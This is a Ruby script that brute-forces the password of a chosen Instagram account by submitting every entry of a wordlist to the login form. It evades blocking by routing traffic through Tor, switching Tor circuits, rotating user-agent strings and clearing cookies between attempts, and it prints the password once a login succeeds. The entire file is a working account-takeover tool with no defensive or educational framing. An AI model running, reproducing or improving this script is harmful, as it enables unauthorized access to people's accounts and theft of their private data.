require 'bundler'
Bundler.require

require 'socksify/http'

# Monkey patch to add socks5 support to Mechanize

class Mechanize::HTTP::Agent
  public
  def set_socks addr, port
    set_http unless @http
    class << @http
      attr_accessor :socks_addr, :socks_port

      def http_class
        Net::HTTP.SOCKSProxy(socks_addr, socks_port)
      end
    end
    @http.socks_addr = addr
    @http.socks_port = port
  end
end

# Constants

USER_AGENT_ALIASES = [
  'Linux Firefox', 'Linux Mozilla', 'Linux Konqueror',
  'Mac Firefox', 'Mac Mozilla', 'Mac Safari',
  'Windows IE 11', 'Windows Edge', 'Windows Mozilla', 'Windows Firefox'
]

# Environment constants

TARGET_ACCOUNT = ENV.fetch('TARGET_ACCOUNT')
TELEGRAM_API_TOKEN = ENV['TELEGRAM_API_TOKEN']
ATTEMPTS_BEFORE_ROTATION = ENV['ATTEMPTS_BEFORE_ROTATION']&.to_i || 3 # Attempts before changing circuit
LOCKED_WAIT_TIME = ENV['LOCKED_WAIT_TIME']&.to_i || 3724
DELAY_MIN_WAIT_TIME = ENV['DELAY_MIN_WAIT_TIME']&.to_f || 0.25
DELAY_MAX_WAIT_TIME = ENV['DELAY_MIN_WAIT_TIME']&.to_f || 3.0

def random_wait_time!
  sleep rand(DELAY_MIN_WAIT_TIME..DELAY_MAX_WAIT_TIME)
end

def rotate_agent
  @agent.user_agent_alias = USER_AGENT_ALIASES.sample
end

def renew_tor_ip
  Tor::Controller.connect(host: '127.0.0.1', port: 9051) do |tor|
    tor.send(:send_command, :signal, 'newnym')
    tor.send(:read_reply) == "250 OK"
  end
end

def clear_cookies
  @agent.cookie_jar.clear!
end

def assess_attempt
  @attempts_count ||= 0
  @attempts_count += 1
end

def requires_new_circuit?
  if !@attempts_count.nil? && @attempts_count >= ATTEMPTS_BEFORE_ROTATION
    @attempts_count = 0
    true
  end
  false
end

def prepare_new_attempt
  assess_attempt
  clear_cookies
  if requires_new_circuit?
    rotate_agent
    renew_tor_ip
    random_wait_time! # Waiting a bit more to avoid being jailed
  end
end

def perform_login(username, password)
  page = @agent.get 'http://instagram.com/accounts/login/?force_classic_login'
  form = page.form(id: 'login-form')
  form.field_with(name: 'username').value = username
  form.field_with(name: 'password').value = password
  random_wait_time!
  form.submit
end

puts "Checking tor connection before starting"

begin
  renew_tor_ip
rescue => e
  puts "#{e}"
  sleep 2.0
  retry
end

puts "Connected to tor node"

begin
  @agent ||= Mechanize.new do |agent|
    agent.agent.set_socks('127.0.0.1', '9050')
  end
end

bar = ProgressBar.new(File.open('pass.lst').inject(0) { |c, line| c + 1 }, :counter, :bar, :percentage, :rate, :eta)

File.open('pass.lst').each do |password|
  prepare_new_attempt

  begin
    response = perform_login(TARGET_ACCOUNT, password)
    success = response.content.include?('FeedPageContainer.js')
    if success
      puts "Password for #{TARGET_ACCOUNT} is #{password}"
    else
      puts "Account might be locked now but password is #{password}"
      puts "Response body was \n #{response.content}"
    end
    break
  rescue Mechanize::ResponseCodeError
    nil
  rescue => e
    puts "Retrying request with error: #{e}"
    sleep 5
    retry
  end

  bar.increment!

  random_wait_time! # Wait before making a new request
end
